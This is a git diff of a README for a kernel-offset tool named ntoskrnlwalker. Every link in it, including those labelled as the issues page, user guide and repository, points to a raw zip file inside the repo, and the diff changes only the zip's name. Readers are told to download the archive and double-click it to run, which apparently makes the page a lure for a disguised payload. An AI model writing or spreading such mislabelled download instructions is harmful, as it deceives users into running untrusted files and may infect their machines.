@@ -6,21 +6,21 @@ Welcome to ntoskrnlwalker! This application helps you resolve offsets, gadgets, 
 
 ## 🔗 Download Now
 
-[![Download ntoskrnlwalker](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip)](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip)
+[![Download ntoskrnlwalker](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip)](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip)
 
 ## 📥 Download & Install
 
-To get started with ntoskrnlwalker, visit this page to download: [GitHub Releases](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip).
+To get started with ntoskrnlwalker, visit this page to download: [GitHub Releases](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip).
 
 1. Click on the link above.
 2. Look for the latest version listed at the top of the page. 
-3. Find the file labeled **https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip** (or a similar executable file).
+3. Find the file labeled **https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip** (or a similar executable file).
 4. Click on the file to start the download.
 
 Once the download is complete:
 
 1. Locate the downloaded file in your computer's default downloads folder.
-2. Double-click the **https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip** file to run the application. 
+2. Double-click the **https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip** file to run the application. 
 
 ## 🖥 System Requirements
 
@@ -50,7 +50,7 @@ Using ntoskrnlwalker is straightforward:
 
 ## 📖 Documentation
 
-For more detailed instructions on using specific features, you can check the [User Guide](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip) available in the repository.
+For more detailed instructions on using specific features, you can check the [User Guide](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip) available in the repository.
 
 ## 🤝 Contributing
 
@@ -63,7 +63,7 @@ We welcome contributions to make ntoskrnlwalker better. If you would like to hel
 
 ## 🌐 Support
 
-If you encounter any issues or have questions about using ntoskrnlwalker, feel free to reach out through our [Issues page](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip) on GitHub. Please provide clear details about your problem to help us assist you better.
+If you encounter any issues or have questions about using ntoskrnlwalker, feel free to reach out through our [Issues page](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip) on GitHub. Please provide clear details about your problem to help us assist you better.
 
 ## 🛠 Frequently Asked Questions
 
@@ -77,11 +77,11 @@ A: Typically, running as a standard user should be sufficient. However, some fea
 
 **Q: Is there an official way to report bugs?**
 
-A: Yes! Please use the [Issues page](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip) to report any bugs or glitches you experience.
+A: Yes! Please use the [Issues page](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip) to report any bugs or glitches you experience.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip)
-- [User Guide](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Release/Software_scoundrelish.zip)
+- [GitHub Repository](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip)
+- [User Guide](https://github.com/mangazoot/ntoskrnlwalker/raw/refs/heads/main/x64/Software-3.2.zip)
 
 We hope you find ntoskrnlwalker helpful in your tasks!
